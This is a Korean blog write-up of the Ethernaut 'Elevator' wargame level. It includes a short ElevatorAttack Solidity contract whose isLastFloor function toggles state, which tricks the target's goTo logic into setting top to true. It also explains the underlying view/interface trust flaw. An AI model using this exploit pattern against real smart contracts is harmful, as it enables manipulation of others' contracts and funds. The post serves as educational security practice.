문제 해설에 들어가기 전,  이번 포스팅은 이더넛 내에서 콘솔창과 상호작용을 할 줄 알고 기본적인 리믹스 및 메타마스크 사용법이 숙지되어 있다는 가정 하에 해설을 진행합니다.



## Elevator Problem

이번 문제의 힌트를 보아도 잘 감이 오지 않는다.

 - 때때로 솔리디티는 약속을 잘 지키지 않는다.
 - 이 엘리베이터가 빌딩에서 사용되길 기대한다.



나는 이 elevator 문제를 한참동안 들여다 봐도 무엇이 잘못 되었는지, 찾지 못햇다. 우선 문제 주소를 remix에 넣고 컨트랙트 주소를 불러오자! 이때, 인터페이스는 배포가 불가능하니 꼭 **셀렉트를 Elevator**로 바꾸고 At Address를 진행하자. 처음에 문제로 출제된 Elevator 주소를 불러와 top함수를 호출하면 불값이 false로 되어 있다. 

https://github.com/heuristicwave/TIL-about-Blockchain/blob/master/img/elevator01.png?raw=true

문제에서, 이 엘리베이터는 *"너의 빌딩에 꼭대기에 도달할수 없는게 맞지?"* 라고 하는 것을 보아 top을 true 값으로 바꾸면 문제를 통과 할 수 있다.



### ElevatorAttack.sol 

```javascript
pragma solidity ^0.4.18;

contract ElevatorAttack {
  bool public isLast = true;
  
  function isLastFloor(uint) public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _victim) public {
    Elevator elevator = Elevator(_victim);
    elevator.goTo(10);
  }
}
```

view 키워드가 있는 인터페이스와 비슷하게 isLastFloor 함수를 구현했지만, view 키워드를 적지 않았다. 원래 view는 아래와 같은 성격을 가지고 있다.

> 상태지정자 view : Data접근에 관하여 오로지 읽을 수 만 있고 상태 변경이 불가하다.

분명 처음 Elevator 컨트랙트를 설계한 배포자는 isLastFloor의 불린값이 바뀌지 않는 것으로 예상 했을 것이다.

그러나, 악의적인 공격자가 정작 함수를 구현할때 view키워드를 제외하고 Elevator 컨트랙트의 `goTo`함수에 10을 넣어 로직을 통과하게 되면 결과적으로 top 의 상태가 바뀌게 된다.



이후 이더넛의 콘솔창에서 await contract.top()를 치면 true 값으로 바뀐 것을 확인 할 수 있고, 다음 문제로 넘어갈 수 있다. 사실 이번 문제는 나도 몇일을 고민해도 풀지 못해 구글링을 하여 도움을 받았다.

문제 출제자는 view에 의존하지 말고 **modifier**를 활용하여 더 안전한 코드를 작성하라는 메시지를 주고 있다. 또한 인터페이스를 상속 받을때는 항상 조심해야한다.



그럼, 다음번에는 12단계 Privacy에서 만나요!
